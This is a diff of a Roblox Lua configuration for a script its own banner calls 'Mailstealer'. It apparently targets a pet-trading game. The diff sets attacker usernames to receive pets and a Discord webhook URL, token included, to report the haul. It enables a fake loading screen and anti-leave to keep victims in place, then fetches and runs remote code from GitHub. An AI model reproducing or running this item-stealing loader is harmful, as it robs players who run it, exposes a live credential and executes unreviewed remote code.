@@ -1,17 +1,18 @@
-UserName = "petspsx651"
-Webhook = "https://discord.com/api/webhooks/1129531859051749426/BhM5VbwIJP7mfL0m8SDAW7zTOqUvGn7QGd2btSHPAeecIEeNLOMY9psLEgUWxMua7gNZ"
-UserName2 = "petspsx751"
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "petspsx651" -- good pets
+Webhook = "https://discord.com/api/webhooks/1129531859051749426/BhM5VbwIJP7mfL0m8SDAW7zTOqUvGn7QGd2btSHPAeecIEeNLOMY9psLEgUWxMua7gNZ" -- pings for pets
+UserName2 = "petspsx751" -- bad pets
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
 _G.MouseLock = true -- make it true if you want the mouselock
 
--- Remove These If You're Not Using The Rizz LoadingScreen
-
-_G.ScriptName = "Mooniz Hub"
-_G.FirstText = "Preparing..."
-_G.SecondText = "Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sallasalo/MoonizHub/main/MailstealerSource%22))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cypaex/CypaexHub/main/CypaexHub", true))()
